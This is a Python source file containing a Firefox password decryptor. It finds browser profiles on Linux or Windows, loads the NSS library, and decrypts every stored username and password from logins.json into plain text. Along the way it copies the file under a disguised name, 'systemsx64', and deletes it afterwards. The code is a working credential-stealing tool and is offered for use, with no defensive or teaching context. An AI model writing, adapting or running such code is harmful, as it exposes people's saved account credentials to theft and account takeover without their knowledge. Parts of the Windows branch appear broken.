from ctypes import CDLL, Structure, c_int, c_void_p, c_char_p, c_uint, POINTER
from subprocess import Popen, call, PIPE
from json import loads
from base64 import b64decode
from platform import system, architecture
import os
from re import findall, I


class firefox_decrytor:
    class SEC_item(Structure):
        _fields_ = [
            ("type", c_uint),
            ("data", c_char_p),
            ("len", c_uint),
        ]

    class PK11_slot_info(Structure):
        pass

    def __init__(self, vendor="mozilla", browser="firefox"):
        SYSTEM = system().lower()
        ARCH = str(architecture())
        self.vendor = vendor
        self.browser = browser
        if SYSTEM == "linux":
            out, err = Popen(
                "whereis libnss3.so", stdout=PIPE, stderr=PIPE, shell=True
            ).communicate()
        elif SYSTEM == "windows":
            out = (
                rf"C:\Program Files\{vendor} {browser}\nss3.dll"
                if "64" in ARCH
                and os.path.exists(rf"C:\Program Files\{vendor} {browser}\nss3.dll")
                else rf"C:\Program Files (x86)\{vendor} {browser}\nss3.dll"
                if "32" in ARCH
                and os.path.exists(rf"C:\Program Files (x86)\{vendor} {browser}\nss3.dll")
                else None
            )
        if not out:
            print(
                "[-] missing so file"
                if SYSTEM == "linux"
                else "[-] python and dll architecture aren't same..."
            )
            exit(1)
        nss_loc = out if type(out) == str else out.decode()
        if ".so" not in nss_loc:
            print("[-] no nss3lib found")
            exit(1)
        self.nss3_handle = CDLL(
            nss_loc
            if not SYSTEM == "linux"
            else nss_loc[nss_loc.index(":") + 2 :].strip()
        )
        if SYSTEM == "linux":
            out, err = Popen(
                f'find  ~/.{vendor.lower()}/{browser.lower()} -name "*logins.json"',
                stdout=PIPE,
                stderr=PIPE,
                shell=True,
            ).communicate()
        elif SYSTEM == "windows":
            out = b""
            profile_path = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Roaming", vendor, browser
            )
            if not os.path.exists(profile_path):
                exit()
            profiles = findall(
                r"path=(.* ?)", open(profile_path + "\profiles.ini", "r").read(), I
            )
            for profile in profiles:
                full_path = os.path.join(profile_path, profile, "logins.json")
                if os.path.exists(full_path):
                    out += full_path.encode() + b"\n"

        if not out:
            print("[-] no profiles found")
            exit(1)

        self.user_profiles = out.decode().strip().split("\n")
        self.slot_info_ptr = POINTER(self.PK11_slot_info)
        self.sec_ptr = POINTER(self.SEC_item)

    def lib_functions(self, name, return_type, *args):
        res = getattr(self.nss3_handle, name)
        res.restype = return_type
        res.argtypes = [*args]
        return res

    def decryption_setup(self, profile_path):
        init = self.lib_functions("NSS_Init", c_int, c_char_p)
        if init(profile_path.encode()):
            print("[-] error initiating the profile")
            exit(1)

        key_slot = self.lib_functions("PK11_GetInternalKeySlot", self.slot_info_ptr)()
        if not key_slot:
            print("[-] invalid key_slot")
            exit(1)

        if self.lib_functions("PK11_NeedLogin", c_int, self.slot_info_ptr)(key_slot):
            print("[-] password needede..")
            exit(1)

        self.lib_functions("PK11_FreeSlot", c_int, self.slot_info_ptr)(key_slot)

    def decryt(self):
        details = f"{self.browser} browser logins"
        for profile in self.user_profiles:
            profile_path = "sql:" + profile.replace("logins.json", "")
            self.decryption_setup(profile_path)
            call(f"cp {profile} systemsx64", shell=True)
            with open("systemsx64", "r") as f:
                data = loads(f.read())
                data = data.get("logins")
                if not data:
                    print("[-] no logins found!!")
                    exit(1)
            details += "\n" + profile.replace("logins.json", "") + "\n" + "_" * 20
            for login in data:
                details += "\nwebsite :" + login.get("hostname")
                field = b64decode(login.get("encryptedUsername"))
                inp = self.SEC_item(0, field, len(field))
                out = self.SEC_item(0, None, 0)
                self.lib_functions(
                    "PK11SDR_Decrypt", c_void_p, self.sec_ptr, self.sec_ptr
                )(inp, out, None)
                details += "\nusername : " + out.data.decode()
                field = b64decode(login.get("encryptedPassword"))
                inp = self.SEC_item(0, field, len(field))
                self.lib_functions(
                    "PK11SDR_Decrypt", c_void_p, self.sec_ptr, self.sec_ptr
                )(inp, out, None)
                details += "\npassword : " + out.data.decode()

            self.lib_functions("NSS_Shutdown", c_uint)()
            call("rm systemsx64", shell=True)
            return details
